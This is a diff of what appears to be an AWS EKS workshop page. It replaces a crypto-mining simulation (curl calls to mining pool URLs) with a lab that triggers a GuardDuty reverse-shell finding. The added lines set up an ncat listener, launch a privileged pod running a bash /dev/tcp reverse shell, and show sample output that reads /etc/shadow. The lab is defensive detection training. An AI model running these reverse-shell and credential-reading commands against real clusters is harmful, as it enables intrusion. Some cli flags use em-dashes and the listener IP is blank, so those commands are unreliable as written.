@@ -3,32 +3,68 @@ title: "Reverse Shell"
 sidebar_position: 142
 ---
 
-This finding indicates that a container tried to do a cryto mining inside a Pod.
+In this last lab exercise for Amazon GuardDuty findings, you'll simulate a reverse shell attack in your EKS Cluster environment.
 
-To simulate the finding we'll be running a `ubuntu` image Pod in the `default` Namespace using the interactive mode, and from there run a couple of commands to start a crypto mining process, as an attacker would do.
-
-Run the below command to run the Pod in an interactive mode.
+This one is a little tricky and since we want to run it as a simulation in a controlled environment, it will require you to create another Cloud9 environment that will serve as the offensor instance. To do that, open your [CloudShell](https://console.aws.amazon.com/cloudshell/home), and run the following commands.
 
 ```bash
-$ kubectl run -ti crypto --image ubuntu --rm --restart=Never
+$ aws ec2 describe-subnets --query 'Subnets[0].SubnetId' --filters "Name=tag:Name,Values=*SubnetPrivate*" --output text
+$ aws cloud9 create-environment-ec2 —name rshell —instance-type t2.micro —subnet-id $RSHELL_SUBNET
 ```
 
-Inside the Pod, run the following commands to simulate a crypto miniing process.
+Open another tab in your browser and go to the [Amazon Cloud9 Console](https://console.aws.amazon.com/cloud9control/home). You should se another IDE environment with the nama `rshell`, click on the **Open** link next to the IDE environment name.
+
+On the Terminal of the new environment, you'll need to get the IP Address of the Cloud9 instance, install and run the `ncat` tool to simulate an attack tentative.
 
 ```bash
-$ apt update && apt install -y curl
-$ curl -s http://pool.minergate.com/zaq12wsxcde34rfvbgt56yhnmju78iklo90p /dev/null &
-$ curl -s http://xmr.pool.minergate.com/p09olki87ujmnhy65tgbvfr43edcxsw21qaz  > /dev/null &
+$ curl http://169.254.169.254/latest/meta-data/local-ipv4
 ```
 
-These commands will trigger three different findings in the [GuardDuty Findings console](https://console.aws.amazon.com/guardduty/home#/findings).
+Note the IP Address on the output.
 
-First one is `Execution:Runtime/NewBinaryExecuted`, which is related to the `curl` package installating via APT tool.
+```bash
+$ sudo yum install ncat -y
+$ ncat -nvlp 6666
+Ncat: Version 6.40 ( http://nmap.org/ncat )
+Ncat: Listening on :::6666
+Ncat: Listening on 0.0.0.0:6666
+```
 
-![](assets/binary-execution.png)
+This last command will start listening all connections on port 6666.
 
-Take a closer look to the details of this findings, because they are related to the GuardDuty Runtime monitoring, it shows specific information regarding the Runtime, Context, and Processes.
+Now, go back to the `eks-workshop-ide` terminal, and run a new Pod that will emulate the compromised workload.
 
-Second and third ones, are `CryptoCurrency:Runtime/BitcoinTool.B!DNS` findings. Notice again that the finding details brings different information, this time showing the DNS_REQUEST action, and the **Threat inteligene Evidences**.
+```bash
+$ kubectl run -ti --rm --restart=Never --image=ubuntu --privileged rshell -- /bin/bash -c "bash -i >& /dev/tcp//6666 0>&1"
+If you don't see a command prompt, try pressing enter.
+``` 
 
-![](assets/crypto-runtime.png)
+If you go back to the `rshell` IDE, you will be able to see that a new connection from offensor instance to the Pod, and you are able to run commands to the newly created Pod inside your Amazon EKS Cluster. Try a few privileged commands like below.
+
+```bash
+Ncat: Connection from 10.42.129.208.
+Ncat: Connection from 10.42.129.208:39692.
+root@rshell:/# ls /etc
+root@rshell:/# cat /etc/passwd
+root@rshell:/# cat /etc/shadow
+root@rshell:/# touch /etc/attacker
+touch /etc/attacker
+root@rshell:/# ls /etc/attacker
+ls /etc/attacker
+/etc/attacker
+root@rshell:/# 
+```
+
+Notice that the terminal where you started the Pod is completely frozen, and you are not able to run commands. To end the session, hit `CTRL+C` or `CMD+C` on the `rshell` IDE. The Pod on the `eks-workshop-ide` will be terminated and you will be able to take control again.
+
+
+If you open the [GuardDuty Findings console](https://console.aws.amazon.com/guardduty/home#/findings), you will see the `Execution:Runtime/ReverseShell` finding.
+
+![](assets/reverse-shell.png)
+
+
+To clean up, delete the `rshell` Cloud9 IDE environment, on your [CloudShell](https://console.aws.amazon.com/cloudshell/home).
+
+```bash
+aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --query 'StackSummaries[].StackName' | awk -F , '/rshell/ {print $1}' | xargs aws cloudformation delete-stack --stack-name
+```
